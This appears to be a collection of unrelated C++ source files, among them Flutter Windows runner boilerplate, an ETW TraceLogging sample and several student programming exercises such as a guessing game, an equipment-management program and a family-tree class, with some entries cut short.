    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <bitset>\n#include <conio.h>\n#include <iostream>\n#include <chrono>\n#include <thread>\n\n#include <windows.h> // Definitions required by TraceLoggingProvider.h\n#include <TraceLoggingProvider.h> // The C/C++ TraceLogging API\n\nusing namespace std;\n\nvoid EmitCaptureStateEvents(ULONGLONG match_any_keyword, ULONGLONG match_all_keyword);\n\n// Define a handle to a TraceLogging provider\nTRACELOGGING_DEFINE_PROVIDER(\n  g_hMyComponentProvider,\n  \"EtwCallbackSample\",\n  // {0205c222-cf97-5c11-9756-56a2cee02cb0}\n  (0x0205c222, 0xcf97, 0x5c11, 0x97, 0x56, 0x56, 0xa2, 0xce, 0xe0, 0x2c, 0xb0));\n\n// This callback is invoked by Windows every time the ETW tracing status is changed for this application.\nvoid WINAPI ETWEnableCallback(LPCGUID /* source_id */, ULONG is_enabled,\n  UCHAR level, ULONGLONG match_any_keyword,\n  ULONGLONG match_all_keyword,\n  PEVENT_FILTER_DESCRIPTOR filter_data,\n  PVOID /* callback_context */)\n{\n  cout\n    << \"is_enabled:\" << (void*)is_enabled\n    << \"; level:\" << (void*)level\n    << \"; match_any_keyword:\" << (void*)match_any_keyword\n    << \"; match_all_keyword:\" << (void*)match_all_keyword\n    << \"; filter_data:\" << (void*)filter_data\n    << endl\n  ;\n\n  if (is_enabled == 2)\n  {\n    auto t = thread(EmitCaptureStateEvents, match_any_keyword, match_all_keyword);\n    t.join();\n  }\n}\n\nvoid LoopUntilQ()\n{\n  cout << \"Type 'q' when you want to quit.\" << endl;\n\n  char c;\n  \n  while (true) {\n    c = _getch();\n    if (c == 'q') {\n      break;\n    }\n  }\n}\n\nint main()\n{\n  cout << \"Calling TraceLoggingRegisterEx.\" << endl;\n  TraceLoggingRegisterEx(g_hMyComponentProvider, ETWEnableCallback, nullptr);\n  cout << \"TraceLoggingRegisterEx returned.\" << endl << endl;\n\n  LoopUntilQ();\n\n  cout << endl << \"Calling TraceLoggingUnregister.\" << endl;\n  TraceLoggingUnregister(g_hMyComponentProvider);\n  cout << \"TraceLoggingUnregister returned.\" << endl;\n}\n\n\nvoid EmitCaptureStateEvents(ULONGLONG match_any_keyword, ULONGLONG match_all_keyword)\n{\n  cout\n    << \"Emitting capture state events for \"\n    << \"; match_any_keyword:\" << (void*)match_any_keyword\n    << \"; match_all_keyword:\" << (void*)match_all_keyword\n    << endl\n  ;\n\n  this_thread::sleep_for(chrono::milliseconds(10000));\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider, \n    \"capturestate-event1\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x1)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event2\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x2)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event4\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x4)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event8\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x8)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event10\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x10)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event20\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x20)\n  );\n\n  cout\n    << \"Done emitting capture state events for \"\n    << \"; match_any_keyword:\" << (void*)match_any_keyword\n    << \"; match_all_keyword:\" << (void*)match_all_keyword\n    << endl\n  ;\n}",
    "/ UMBC - CMSC 341 - Spring 2024 - Proj3                                                                                                                                     \n#include \"rqueue.h\"\n\n//Name: RQueue (Constructor)                                                                                                                                                 \n//Desc: Creates empty queue and initializes values                                                                                                                           \n//Preconditions: required variables provided                                                                                                                                 \n//Postconditions: Empty queue is created with intialized values                                                                                                              \nRQueue::RQueue(prifn_t priFn, HEAPTYPE heapType, STRUCTURE structure) {\n  m_heap = nullptr;\n  m_size = 0;\n  m_priorFunc = priFn;\n  m_heapType = heapType;\n  m_structure = structure;\n}\n\n\n\n//Name: Destructor                                                                                                                                                           \n//Desc: Deallocates all memory and re-initializaed the member variables                                                                                                      \n//Preconditions: Heap exists                                                                                                                                                 \n//Postconditions: All memory is deallocated and member variables reinitialized                                                                                               \nRQueue::~RQueue() {\n  clear();\n}\n\n\n\n//Name: Destructor                                                                                                                                                           \n//Desc: Deallocates all nodes and re-initializaed the member variables                                                                                                       \n//Preconditions: Heap exists                                                                                                                                                 \n//Postconditions: All nodes are deallocated and member variables reinitialized                                                                                               \n//leaving an empty heap                                                                                                                                                      \nvoid RQueue::clear() {\n  clear(m_heap);\n  m_size = 0;\n}\n\n\n\n//Name: RQueue (Copy Constructor)                                                                                                                                            \n//Desc: creates a deep copy of rhs object                                                                                                                                    \n//Preconditions: Heap exist                                                                                                                                                  \n//Postconditions: a deep copy of heap is created                                                                                                                             \nRQueue::RQueue(const RQueue& rhs) {\n  //copies mem variables                                                                                                                                                     \n  m_size = rhs.m_size;\n  m_priorFunc = rhs.m_priorFunc;\n  m_heapType = rhs.m_heapType;\n  m_structure = rhs.m_structure;\n\n  //if root exists                                                                                                                                                           \n  if(rhs.m_heap != nullptr){\n    //recursive copy                                                                                                                                                         \n    copy(m_heap, rhs.m_heap);\n\n    //in case empty heap                                                                                                                                                     \n  }else{\n    m_heap = nullptr;\n  }\n}\n\n//Name: getHeapType                                                                                                                                                          \n//Desc: returns heap type                                                                                                                                                    \n//Preconditions: tree exists with defined heap type                                                                                                                          \n//Postconditions: heap type is returned                                                       ",
    "#include <flutter/dart_project.h>\r\n#include <flutter/flutter_view_controller.h>\r\n#include <windows.h>\r\n\r\n#include \"flutter_window.h\"\r\n#include \"utils.h\"\r\n\r\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\r\n                      _In_ wchar_t *command_line, _In_ int show_command) {\r\n  // Attach to console when present (e.g., 'flutter run') or create a\r\n  // new console when running with a debugger.\r\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\r\n    CreateAndAttachConsole();\r\n  }\r\n\r\n  // Initialize COM, so that it is available for use in the library and/or\r\n  // plugins.\r\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\r\n\r\n  flutter::DartProject project(L\"data\");\r\n\r\n  std::vector<std::string> command_line_arguments =\r\n      GetCommandLineArguments();\r\n\r\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\r\n\r\n  FlutterWindow window(project);\r\n  Win32Window::Point origin(10, 10);\r\n  Win32Window::Size size(1280, 720);\r\n  if (!window.Create(L\"codelab1\", origin, size)) {\r\n    return EXIT_FAILURE;\r\n  }\r\n  window.SetQuitOnClose(true);\r\n\r\n  ::MSG msg;\r\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\r\n    ::TranslateMessage(&msg);\r\n    ::DispatchMessage(&msg);\r\n  }\r\n\r\n  ::CoUninitialize();\r\n  return EXIT_SUCCESS;\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_ejercicio10\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n  Um algoritmo que tem como objetivo ser um jogo com 3 niveis de dificuldade, \nsendo elas: [facil, medio, dificil].\n  O jogo ter\u00e1 um numero sorteado e o objetivo do jogador \u00e9 descobrir o numero sorteado pelo metodo de tentativa e erro.\n*/\n#include <iostream> //Biblioteca principal de entrada e saida padr\u00e3o.\n#include <cstdlib> // Bibliotecas padr\u00e3o do c.\n#include <ctime> // Biblioteca time do c.\n\nusing namespace std; // using std para agilizar o proscesso de codar os 'cout' e 'cin'.\n\nbool chutes(short numSorte, short dificuldade, int *tentativas, short *pontos); // Mostrando minha fun\u00e7\u00e3o para o codigo.\n\nbool chutes(short numSorte, short dificuldade, int *tentativas, short *pontos){ // Declarando fun\u00e7\u00e3o.\n  short numChute = 0; // Dando um valor inicial para numChute.\n  short numD2 = -1; // Valor inicial para numD2.\n\n  if(dificuldade == 2){ // Se escolha da dificuldade seja media, fa\u00e7a numD2 == 16 e iniciar com 200 pontos.\n    numD2 = 16;\n    *pontos = 200;\n  }else if(dificuldade == 3){ // Se dificuldade for igual a dificil numD2 == 6 e iniciar com 300 pontos.\n    numD2 = 6;\n    *pontos = 300;\n  }\n\n  do{\n\n    cout << \"\\n\\tTentativas \" << *tentativas << \" chute um numero: \"; // Mostra o numero da tentativa indo de 0 a infinito dependendo da dificuldade escolhida.\n\n    cin >> numChute; // l\u00ea o valor chutado.\n\n    if(numChute < numSorte)cout << \"\\t\\033[1;91mSeu numero \u00e9 menor que o numero da sorte.\\x1b[0m\\n\"; // Se o numero chutado for menor que numro sorteado vai escrever em vermelho uma mensagem sobre.\n    else if(numChute > numSorte) cout << \"\\t\\033[1;33mSeu numero \u00e9 maior que o numero da sorte.\\x1b[0m\\n\"; // Se o numero chutado for maior que numro sorteado vai escrever em amarelo uma mensagem sobre.\n\n    if(*tentativas > 0 || numChute == numSorte){ // Condi\u00e7\u00e3o para pular a primeira execu\u00e7\u00e3o e caso acerte.\n      if(dificuldade == 1) *pontos = *pontos - 2; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n      else if(dificuldade == 2) *pontos = *pontos - 12; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n      else if(dificuldade == 3) *pontos = *pontos - 43; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n    }\n\n    *tentativas = *tentativas + 1; // Acrescenta 1 a tentativas.\n  }while(numChute != numSorte && *tentativas != numD2); // Vai continuar perguntando o valor sorteado at\u00e9 que acerte ou acabe o numero definido de tentativas(O numero de tentativas ser\u00e1 definido de acordo com o nivel de dificuldade escolhida pelo jogador.).\n\n  return (numChute == numSorte); // Retorna um valor boleano sendo 1 : 0\n}\n\nint main(){\n  \n  srand(time(NULL));\n  const short numSorte = rand() % 101; // O numero sorteado\n\n  short dificuldade = 0; // Valor inicial para dificuldade\n  int tentativas = 0; // valor inicial para o numero de tentativas\n  short pontos = 100; // valor inicial de pontos, para caso seja escolhida a dificuldade 1.\n\n  cout << \"\\t********************\\n\";\n  cout << \"\\t*----Hello Word----*\\n\";\n  cout << \"\\t********************\\n\";\n\n  cout << \"\\n\\tEscolha sua dificuldade \\n \\x1b[1;96mfacil: 1\\n \\x1b[1;90mmedio: 2\\n \\x1b[1;95mdificil: 3\\n\\t\\x1b[0mdificuldade: \";\n  cin >> dificuldade; // Escolhe a dificuldade.\n\n  if(chutes(numSorte, dificuldade, &tentativas, &pontos)) cout << \"\\n\\t\\x1b[1;33mVoc\u00ea ganhou, parab\u00e9ns\\n\"; // Aqui vai executar a fun\u00e7\u00e3o chutes e quado finalizar vai retornar um valor boleano, sendo que se for verdadeiro, aparecer\u00e1 a mensagem para o jogador que ele ganhou.\n  else{\n    cout << \"\\n\\t\\033[91mVoc\u00ea perdeu. O numero era \" << numSorte << \" quem sabe na proxima.\\n\"; // Caso contrario mostrar\u00e1 a mensagem que perdeu.\n    pontos = 0; // E vai perder a pontua\u00e7\u00e3o.\n  }\n\n  cout << \"\\n\\tVoc\u00ea tentou \" << tentativas << \" vezes\\n\\n\\t\" << pontos << \" Pontos\\n\\n\"; // Mostra o numero de vezes que chutou at\u00e9 acertar ou at\u00e9 perder, e mostra sua pontua\u00e7\u00e3o final.\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n#include <stdexcept>\r\n\r\nusing namespace std;\r\n// class Utilisateur  (user)\r\nclass User {\r\nprivate:\r\n    static int idU;\r\n    int userID;\r\n    string nom, prenom;\r\n    string username;\r\n    string password;\r\n    string departement;\r\npublic:\r\n/* Constructors */\r\n    User(){ userID = idU++; }\r\n    User(string n, string pre, string u, string p, string d):userID(idU++), nom(n), prenom(pre), username(u), password(p), departement(d){}\r\n    // getters\r\n    int getId()const { return userID; }\r\n    string getNom()const { return nom;}\r\n    string getPrenom()const{return prenom ;}\r\n    string getUsername()const { return username;}\r\n    string getDepartement()const {return  departement ;}\r\n    // setters \r\n    void setNom(string nom) { this->nom = nom;}\r\n    void setPrenom(string prenom) {this->prenom = prenom;}\r\n    void setUsername(string username) {this->username = username;}\r\n    void setPassword(string password) {this->password = password;}\r\n    void setDepartement(string departement) {this->departement = departement;}\r\n\r\n\r\n\r\n    bool authenticate(string u, string p) const {\r\n        return username == u && password == p;\r\n    }\r\n    friend ostream& operator<<(ostream& on, const User& u) {\r\n        on << \"-------------------------------\" << endl;\r\n        on << \"ID de l'utilisateur: \" << u.userID << endl;\r\n        on << \"Nom: \" << u.nom << endl;\r\n        on << \"Prenom: \" << u.prenom << endl;\r\n        on << \"Username: \" << u.username << endl;\r\n        on << \"Departement: \" << u.departement << endl;\r\n        return on;\r\n    }\r\n    friend istream& operator>>(istream& in, User& u){\r\n        cout << \"entrer le  nom de l'utilisateur\"<< endl;\r\n        in >> u.nom;\r\n        cout << \"entrer le prenom de l'utilisateur\"<<endl;\r\n        in >> u.prenom;\r\n        cout << \"entrer le Username de l'utilisateur\"<<endl;\r\n        in >> u.username;\r\n        cout << \"entrer le password de  l'utilisateur\"<<endl;\r\n        in >> u.password;\r\n        cout << \"entrer la departement de  l'utilisateur\"<<endl;\r\n        in >> u.departement;\r\n        return in;\r\n    }\r\n    void aff(){ cout<<\"\\n\\t[ID= \"<<userID<<\"][\"<<nom<<\":\"<<prenom<<\"]\"; }\r\n    ~User() {}\r\n};\r\nint User::idU = 1;\r\n\r\n// class matariel\r\nclass Material {\r\nprivate:\r\n    static  int idM;\r\n    int mId;\r\n    string nom,typeMat,reference,emplacement;\r\n    bool statue;\r\n    vector<User> usersAcce;\r\npublic:\r\n    Material(string n, string t, string r, string e,bool s): mId(idM++), nom(n), typeMat(t), reference(r), emplacement(e),statue(s){}\r\n    // getters est setters\r\n    int getId() const {return mId;}\r\n    const string& getNom() const {return nom;}\r\n    void setNom(const string& name) {nom = name;}\r\n    const string& getType() const {return typeMat;}\r\n    void setType(const string& type) {typeMat = type;}\r\n    const string& getReference() const {return reference;}\r\n    void setReference(const string& ref) {reference = ref;}\r\n    const string& getEmplacement() const {return emplacement;}\r\n    void setEmplacement(const string& place) {emplacement = place;}\r\n    bool isStatue() const {return statue;}\r\n    void setStatue(bool status) {statue = status;}\r\n\r\n    void usersAcceAff(){\r\n        if(!usersAcce.empty()){\r\n            for (auto u:usersAcce) {\r\n                u.aff();\r\n            }\r\n        } else{ cout<<\"*Aucun utilisateur*\";}\r\n    }\r\n    friend ostream& operator<<(ostream& on, const Material& m) {\r\n        on <<\"\\n\\n---------------------------\\n\";\r\n        on << \"ID de matariel: \" << m.mId << endl;\r\n        on << \"Nom: \" << m.nom << endl;\r\n        on << \"type: \" << m.typeMat << endl;\r\n        on << \"reference: \" << m.reference << endl;\r\n        on << \"emplacement: \" << m.emplacement << endl;\r\n        on << \"statut: \";m.statue?cout<<\" en service \"<<endl:cout<<\" Hors service \"<<endl;\r\n        return on;\r\n    }\r\n    friend istream& operator>>(istream& in, Material& m) {\r\n        cout <<\"\\n---------------------------\\n\";\r\n        cout << \"Entrer le nom du materiel : \";\r\n        in >> m.nom;\r\n        cout << \"Entrer le type du materiel : \";\r\n        in >> m.typeMat;\r\n        cout << \"Entrer la reference du materiel : \";\r\n        in >> m.reference;\r\n        cout << \"Entrer l'emplacement du materiel : \";\r\n        in >> m.emplacement;\r\n        cout << \"Le materiel est-il en service ? (1 pour oui, 0 pour non) : \";\r\n        in >> m.statue;\r\n        return in;\r\n    }\r\n    void aff(){\r\n        cout<<\"\\n\\t\\t[-\"<<mId<<\"-]-_-( \"<<nom<<\" )-_-( \"<<typeMat<<\" )\";\r\n    }\r\n    void affX(){\r\n        cout<<\"\\n\\t__________Matarial__________\";\r\n        cout << \"ID de matariel: \" << mId << endl;\r\n        cout << \"Nom: \" << nom << endl;\r\n        cout << \"type: \" << typeMat << endl;\r\n        cout << \"reference: \" << reference << endl;\r\n        cout << \"emplacement: \" << emplacement << endl;\r\n        cout << \"statut: \";statue?cout<<\" en service \"<<endl:cout<<\" Hors service \"<<endl;\r\n    }\r\n    void adduser(User u){\r\n        user",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n#include <string>\r\n#include<vector>\r\n\r\n// Idea is Creating a family tree using a single linked list from head to bottom\r\n\r\nclass Person{\r\n    public: //must specify otherwise default private\r\n    string _name;\r\n    vector<Person*> _children={}; //list of pointers not objects so if one object changes the change is reflected when accessing the pointer instead of ending up with 2 different objects in memory originating from 1 object change.\r\n\r\n    Person(string name){_name=name;}\r\n\r\n    void NullPtrCheck(){\r\n        if (this == nullptr){\r\n            cout<<\"Error: Cannot perform action on Nullptr\\n\";\r\n            return;\r\n        }\r\n    }\r\n\r\n    #pragma region adders\r\n    void addChild(Person* p){\r\n        NullPtrCheck();\r\n        // if (this == nullptr)\r\n        //     cout<<\"Error: Cannot add child to Nullptr\\n\";\r\n        // else\r\n            _children.push_back(p);\r\n        }\r\n\r\n    void addChild(string name){\r\n        // if (this == nullptr)\r\n        //     cout<<\"Error: Cannot add child to Nullptr\\n\";\r\n        // else{\r\n        NullPtrCheck();\r\n        Person* p = new Person(name);\r\n        _children.push_back(p);\r\n        // }\r\n    }\r\n    #pragma endregion\r\n\r\n    #pragma region Printers\r\n    void PrintChildren(){ //this could also be outside of Class in the form of PrintChildren(Person* p) since no private var access needed\r\n        cout<<\"Children of \"<<this->returnName()<<\": \";\r\n        \r\n        //print first child, seperated from loop just for the sake of output format not ending with a \",\"\r\n        if (_children.size()>=1)\r\n            cout<<_children[0]->returnName();\r\n\r\n        for (int i = 1; i < _children.size(); i++)\r\n        {\r\n            cout<<\", \";\r\n            cout<<_children[i]->returnName();\r\n        }\r\n        cout<<\"\\n\";\r\n    }\r\n    #pragma endregion\r\n\r\n    #pragma region getters\r\n    string returnName(){ //NOTE: SINCE CAN BE nullptr, CANNOT JUST PRINT this->name\r\n        if (this != nullptr) {\r\n            return this->_name;\r\n        } else {\r\n            return 